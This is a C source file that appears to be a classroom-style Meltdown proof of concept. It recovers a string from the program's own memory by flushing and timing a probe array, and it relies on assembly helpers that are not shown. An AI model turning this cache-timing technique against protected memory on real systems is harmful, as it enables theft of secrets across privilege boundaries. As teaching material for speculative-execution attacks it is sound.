#include <stdio.h>
#include <string.h>

#define PAGE_SIZE 4096
#define NUM_PAGES 256

// may need to fine-tune for your cpu
#define CACHE_HIT_CYCLES 34

#define NUM_ATTEMPTS 3

extern unsigned int time_load(void *p);
extern void flush_cache(void *p);
extern void try_read(void *p);

char probe_array[PAGE_SIZE * NUM_PAGES];
char *secret = "this is so secret!!!";

int main(int argc, char *argv[]) {
    printf("the target secret is: %s\n", secret);
    printf("inferring secret via meltdown...\n");

    size_t len = strlen(secret);

    for (int i = 0; i < len; i++) {
        void *target_addr = secret + i;

        unsigned int freq[NUM_PAGES] = {0};

        for (int j = 0; j < NUM_ATTEMPTS; j++) {
            for (int k = 0; k < NUM_PAGES; k++) {
                for (int m = 0; m < PAGE_SIZE; m++) {
                    flush_cache(probe_array + (PAGE_SIZE * k) + m);
                    try_read(target_addr);

                    unsigned int t = time_load(probe_array + (PAGE_SIZE * k) + m);
                    if (t <= CACHE_HIT_CYCLES) {
                        freq[k]++;
                    }

                    flush_cache(probe_array + (PAGE_SIZE * k) + m);
                }
            }
        }

        unsigned int most = 0, second_most = 0;
        int first = 0, second = 0;
        
        for (int k = 0; k < NUM_PAGES; k++) {
            if (freq[k] > most) {
                second_most = most;
                second = first;
                most = freq[k];
                first = k;
            }
        }

        printf("%c", first);
        //printf("First candidate: 0x%02x (%c)\nSecond candidate: 0x%02x (%c)\n\n", first, first, second, second);
    }
    printf("\n");
    return 0;
}
